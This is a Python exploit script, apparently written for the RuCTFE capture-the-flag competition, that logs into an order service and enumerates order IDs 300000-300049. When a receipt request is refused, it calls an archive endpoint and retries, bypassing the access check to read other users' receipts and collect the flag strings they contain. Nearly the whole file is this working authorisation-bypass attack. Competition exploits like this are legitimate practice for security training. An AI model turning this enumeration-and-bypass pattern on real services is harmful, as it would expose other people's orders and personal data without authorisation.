import requests
import re

BASE_URL = "http://0-3000.cks.sa.ructfe.org"
USERNAME = "<dummy_username>"
PASSWORD = "<dummy_password>"

def get_session():
    """Create fresh authenticated session"""
    s = requests.Session()
    
    # Get user_id
    r1 = s.post(f"{BASE_URL}/login", data={"username": USERNAME})
    uid_match = re.search(r'user_id["\s:=]+(\d+)', r1.text)
    if not uid_match:
        return None
    
    uid = uid_match.group(1)
    
    # Login
    r2 = s.post(f"{BASE_URL}/login", data={"user_id": uid, "password": PASSWORD})
    if r2.status_code in [200, 302]:
        return s
    return None

print("[*] Authenticating...")
session = get_session()
if not session:
    print("[-] Failed")
    exit()

print(f"[+] Session: {dict(session.cookies)}\n")

authorized = []
unauthorized = []
flags_found = []
archived_orders = []

print("[*] Testing orders 300000-300049\n")

for order_id in range(300000, 300050):
    print(f"Testing {order_id}...", end=' ')
    
    try:
        # Test receipt access
        receipt_resp = session.get(
            f"{BASE_URL}/order/{order_id}/receipt",
            timeout=10
        )
        
        print(f"[{receipt_resp.status_code}]", end=' ')
        
        if receipt_resp.status_code == 200:
            authorized.append(order_id)
            print("AUTH", end='')
            
            # Check for flags
            flags = re.findall(r'FLAG\{[^}]+\}', receipt_resp.text)
            if flags:
                print(f" FLAG!", end='')
                for flag in flags:
                    flags_found.append((order_id, flag, receipt_resp.text))
        
        elif receipt_resp.status_code == 401:
            unauthorized.append(order_id)
            print("UNAUTH - archiving...", end=' ')
            
            # Try to archive
            archive_resp = session.get(
                f"{BASE_URL}/order/{order_id}/archive",
                timeout=10
            )
            print(f"[{archive_resp.status_code}]", end=' ')
            
            if archive_resp.status_code == 200:
                # Retry receipt
                retry_resp = session.get(
                    f"{BASE_URL}/order/{order_id}/receipt",
                    timeout=10
                )
                print(f"retry[{retry_resp.status_code}]", end='')
                
                if retry_resp.status_code == 200:
                    archived_orders.append(order_id)
                    print(" ACCESS!", end='')
                    
                    # Check for flags
                    flags = re.findall(r'FLAG\{[^}]+\}', retry_resp.text)
                    if flags:
                        print(" FLAG!", end='')
                        for flag in flags:
                            flags_found.append((order_id, flag, retry_resp.text))
        
        print()  # New line
        
    except Exception as e:
        print(f"ERROR: {e}")

print("\n" + "="*70)
print("SUMMARY (300000-300049)")
print("="*70)
print(f"Authorized orders: {len(authorized)}")
if authorized:
    print(f"  {authorized}")

print(f"\nUnauthorized orders: {len(unauthorized)}")
if unauthorized:
    print(f"  {unauthorized}")

print(f"\nArchived successfully: {len(archived_orders)}")
if archived_orders:
    print(f"  {archived_orders}")

print(f"\n{'='*70}")
print(f"FLAGS FOUND: {len(flags_found)}")
print("="*70)
if flags_found:
    for order_id, flag, content in flags_found:
        print(f"\nOrder {order_id}:")
        print(f"Flag: {flag}")
        print(f"Full receipt:\n{content}\n")
        print("-"*70)
else:
    print("No flags found in this batch")

